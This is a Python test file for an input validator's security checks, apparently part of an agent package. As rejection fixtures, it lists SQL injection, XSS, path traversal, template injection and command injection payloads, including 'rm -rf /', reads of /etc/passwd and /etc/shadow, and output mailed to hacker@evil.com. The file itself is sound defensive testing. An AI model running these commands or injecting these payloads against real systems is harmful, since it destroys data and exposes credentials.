#!/usr/bin/env python3
"""
Comprehensive tests for the InputValidator security component.

Tests all aspects of input validation and sanitization including:
- SQL injection prevention
- XSS protection
- Command injection detection
- Path traversal prevention
- Template injection protection
- Data type validation
"""

import pytest
from metis_agent.utils.input_validator import (
    InputValidator, ValidationError, validate_input, is_input_safe
)


class TestInputValidator:
    """Test suite for InputValidator class."""
    
    def setup_method(self):
        """Setup test fixtures."""
        self.validator = InputValidator()
    
    # SQL Injection Tests
    def test_sql_injection_prevention(self):
        """Test SQL injection pattern detection."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM users",
            "UNION SELECT * FROM passwords",
            "1' UNION SELECT password FROM users--",
            "'; INSERT INTO users VALUES ('hacker', 'password')--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "admin' OR 1=1#"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError, match="SQL injection"):
                self.validator.validate_string(malicious_input, context="sql")
    
    def test_sql_safe_inputs(self):
        """Test that safe SQL-related inputs pass validation."""
        safe_inputs = [
            "John O'Connor",  # Legitimate apostrophe
            "SELECT items FROM wishlist",  # When SQL context is not specified
            "My name is John",
            "Price: $19.99",
            "Email: user@example.com"
        ]
        
        for safe_input in safe_inputs:
            # Should pass in general context
            result = self.validator.validate_string(safe_input, context="general")
            assert isinstance(result, str)
    
    # XSS Protection Tests
    def test_xss_prevention(self):
        """Test XSS attack pattern detection."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            "<object data='data:text/html,<script>alert(\"xss\")</script>'></object>",
            "<svg onload=alert('xss')>",
            "<link rel='stylesheet' href='javascript:alert(\"xss\")'>",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(\"xss\")'>",
            "<style>body{background:url('javascript:alert(\"xss\")')}</style>",
            "javascript:alert('xss')",
            "onclick='alert(\"xss\")'",
            "onmouseover='alert(\"xss\")'"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError, match="XSS"):
                self.validator.validate_string(malicious_input, context="html")
    
    def test_html_sanitization(self):
        """Test HTML sanitization functionality."""
        test_cases = [
            ("<script>alert('xss')</script>Hello", "Hello"),
            ("&lt;safe&gt;", "&lt;safe&gt;"),
            ("<b>Bold</b> text", "Bold text"),  # Tags removed
            ("Safe text", "Safe text")
        ]
        
        for input_text, expected in test_cases:
            # Should not raise error but sanitize
            result = self.validator._sanitize_html(input_text)
            assert expected in result
    
    # Command Injection Tests
    def test_command_injection_prevention(self):
        """Test command injection pattern detection."""
        malicious_inputs = [
            "ls; rm -rf /",
            "cat file.txt && rm file.txt",
            "echo hello | mail hacker@evil.com",
            "ls; cat /etc/passwd",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "ls & cat /etc/shadow",
            "echo $HOME",
            "ls > /tmp/output && cat /tmp/output",
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "eval('malicious code')",
            "exec('import os')"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError, match="command injection"):
                self.validator.validate_string(malicious_input, context="command")
    
    def test_safe_command_inputs(self):
        """Test that safe command-like inputs pass validation."""
        safe_inputs = [
            "hello world",
            "filename.txt",
            "normal text",
            "user input without dangerous patterns"
        ]
        
        for safe_input in safe_inputs:
            result = self.validator.validate_string(safe_input, context="general")
            assert isinstance(result, str)
    
    # Path Traversal Tests
    def test_path_traversal_prevention(self):
        """Test path traversal pattern detection."""
        malicious_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5C..%5C..%5Cwindows%5Csystem32",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError, match="path traversal"):
                self.validator.validate_string(malicious_input, context="path")
    
    # Template Injection Tests
    def test_template_injection_prevention(self):
        """Test template injection pattern detection."""
        malicious_inputs = [
            "{{7*7}}",  # Jinja2
            "{%set x=7*7%}",  # Jinja2
            "${7*7}",  # JSP/EL
            "<%=7*7%>",  # JSP/ASP
            "#{7*7}",  # Ruby ERB
            "{{constructor.constructor('alert(1)')()}}",  # Angular
            "{{''.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError, match="template injection"):
                self.validator._check_template_injection(malicious_input)
    
    # Data Type Validation Tests
    def test_integer_validation(self):
        """Test integer validation with range checks."""
        # Valid integers
        assert self.validator.validate_integer(42) == 42
        assert self.validator.validate_integer("123") == 123
        assert self.validator.validate_integer("-50") == -50
        
        # Range validation
        assert self.validator.validate_integer(5, min_val=0, max_val=10) == 5
        
        # Invalid inputs
        with pytest.raises(ValidationError):
            self.validator.validate_integer("not_a_number")
        
        with pytest.raises(ValidationError):
            self.validator.validate_integer(15, min_val=0, max_val=10)
        
        with pytest.raises(ValidationError):
            self.validator.validate_integer(-5, min_val=0, max_val=10)
    
    def test_float_validation(self):
        """Test float validation with range checks."""
        # Valid floats
        assert self.validator.validate_float(3.14) == 3.14
        assert self.validator.validate_float("2.71") == 2.71
        assert self.validator.validate_float(42) == 42.0  # Int to float conversion
        
        # Range validation
        assert self.validator.validate_float(5.5, min_val=0.0, max_val=10.0) == 5.5
        
        # Invalid inputs
        with pytest.raises(ValidationError):
            self.validator.validate_float("not_a_number")
        
        with pytest.raises(ValidationError):
            self.validator.validate_float(15.5, min_val=0.0, max_val=10.0)
    
    def test_email_validation(self):
        """Test email address validation."""
        # Valid emails
        valid_emails = [
            "user@example.com",
            "test.email@domain.org",
            "user+tag@example.co.uk",
            "simple@domain.com"
        ]
        
        for email in valid_emails:
            result = self.validator.validate_email(email)
            assert result == email.lower().strip()
        
        # Invalid emails
        invalid_emails = [
            "invalid.email",
            "@domain.com",
            "user@",
            "user space@domain.com",
            "user@domain",
            "a" * 250 + "@domain.com"  # Too long
        ]
        
        for email in invalid_emails:
            with pytest.raises(ValidationError):
                self.validator.validate_email(email)
    
    def test_url_validation(self):
        """Test URL validation."""
        # Valid URLs
        valid_urls = [
            "https://example.com",
            "http://test.domain.org/path",
            "https://subdomain.example.com/path?query=value"
        ]
        
        for url in valid_urls:
            result = self.validator.validate_url(url)
            assert result == url.strip()
        
        # Invalid URLs
        invalid_urls = [
            "not_a_url",
            "ftp://example.com",  # Not in allowed schemes
            "javascript:alert('xss')",
            "http://",
            "https://" + "a" * 2048  # Too long
        ]
        
        for url in invalid_urls:
            with pytest.raises(ValidationError):
                self.validator.validate_url(url)
    
    def test_json_validation(self):
        """Test JSON validation with depth limits."""
        # Valid JSON
        valid_json = '{"name": "John", "age": 30, "city": "New York"}'
        result = self.validator.validate_json(valid_json)
        assert result == {"name": "John", "age": 30, "city": "New York"}
        
        # Invalid JSON
        with pytest.raises(ValidationError):
            self.validator.validate_json('{"invalid": json}')
        
        # Test depth limits
        deep_json = '{"level1": {"level2": {"level3": {"level4": {"level5": {}}}}}}'
        # Should pass with default max_depth=10
        result = self.validator.validate_json(deep_json)
        assert isinstance(result, dict)
        
        # Should fail with low max_depth
        with pytest.raises(ValidationError):
            self.validator.validate_json(deep_json, max_depth=3)
    
    def test_filename_sanitization(self):
        """Test filename sanitization."""
        test_cases = [
            ("normal_file.txt", "normal_file.txt"),
            ("file with spaces.txt", "file with spaces.txt"),
            ("../../../etc/passwd", "passwd"),  # Path components removed
            ("file<>:\"|?*.txt", "file_______.txt"),  # Dangerous chars replaced
            ("", "unnamed_file"),  # Empty filename
            ("a" + "." * 299, "a" + "." * 254),  # Length limited
            ("...   ", "unnamed_file"),  # Leading/trailing dots and spaces
        ]
        
        for input_filename, expected in test_cases:
            result = self.validator.sanitize_filename(input_filename)
            assert result == expected
    
    def test_convenience_functions(self):
        """Test convenience functions."""
        # validate_input function
        result = validate_input("Hello World", "string")
        assert result == "Hello World"
        
        with pytest.raises(ValidationError):
            validate_input("'; DROP TABLE users; --", "string", context="sql")
        
        # is_input_safe function
        assert is_input_safe("Hello World", "string") == True
        assert is_input_safe("'; DROP TABLE users; --", "string", context="sql") == False
        assert is_input_safe("user@example.com", "email") == True
        assert is_input_safe("invalid.email", "email") == False
    
    def test_length_limits(self):
        """Test string length validation."""
        # Should pass within limit
        short_string = "a" * 100
        result = self.validator.validate_string(short_string, max_length=200)
        assert result == short_string
        
        # Should fail when too long
        long_string = "a" * 500
        with pytest.raises(ValidationError, match="too long"):
            self.validator.validate_string(long_string, max_length=100)
    
    def test_null_byte_detection(self):
        """Test null byte detection in inputs."""
        malicious_input = "normal_text\x00hidden_content"
        
        with pytest.raises(ValidationError, match="Null byte"):
            self.validator.validate_string(malicious_input)
    
    def test_context_specific_validation(self):
        """Test that context-specific validation works correctly."""
        # SQL context should be stricter
        sql_input = "SELECT * FROM users"
        
        # Should pass in general context
        result = self.validator.validate_string(sql_input, context="general")
        assert isinstance(result, str)
        
        # Should fail in SQL context due to SQL keywords
        with pytest.raises(ValidationError):
            self.validator.validate_string(sql_input, context="sql")


class TestSecurityIntegration:
    """Integration tests for security components working together."""
    
    def test_full_security_pipeline(self):
        """Test complete security validation pipeline."""
        # Simulate a full request processing pipeline
        user_inputs = [
            ("normal user query", True),
            ("'; DROP TABLE users; --", False),
            ("<script>alert('xss')</script>", False),
            ("ls; rm -rf /", False),
            ("../../../etc/passwd", False),
            ("{{7*7}}", False),
            ("user@example.com", True),
            ("https://example.com", True),
        ]
        
        validator = InputValidator()
        
        for input_text, should_pass in user_inputs:
            try:
                # General validation first
                validated = validator.validate_string(input_text, max_length=1000)
                
                # Additional validations based on content
                if "@" in input_text:
                    validator.validate_email(input_text)
                elif input_text.startswith(("http://", "https://")):
                    validator.validate_url(input_text)
                
                assert should_pass, f"Expected '{input_text}' to fail but it passed"
                
            except ValidationError:
                assert not should_pass, f"Expected '{input_text}' to pass but it failed"
    
    def test_performance_with_large_inputs(self):
        """Test performance with moderately large inputs."""
        import time
        
        validator = InputValidator()
        
        # Test with reasonably large input (10KB)
        large_input = "safe_text " * 1000  # ~10KB
        
        start_time = time.time()
        result = validator.validate_string(large_input, max_length=50000)
        end_time = time.time()
        
        # Should complete within reasonable time (< 1 second)
        assert (end_time - start_time) < 1.0
        assert isinstance(result, str)
    
    def test_error_message_quality(self):
        """Test that error messages are informative and don't leak sensitive info."""
        validator = InputValidator()
        
        test_cases = [
            ("'; DROP TABLE users; --", "SQL injection"),
            ("<script>alert('xss')</script>", "XSS"),
            ("ls; rm -rf /", "command injection"),
            ("../../../etc/passwd", "path traversal"),
            ("{{7*7}}", "template injection"),
        ]
        
        for malicious_input, expected_error_type in test_cases:
            with pytest.raises(ValidationError) as exc_info:
                validator.validate_string(malicious_input, context="general")
            
            error_message = str(exc_info.value)
            assert expected_error_type.lower() in error_message.lower()
            # Ensure we don't leak the actual malicious content in error messages
            assert malicious_input not in error_message


if __name__ == "__main__":
    # Run basic tests if script is executed directly
    pytest.main([__file__, "-v"])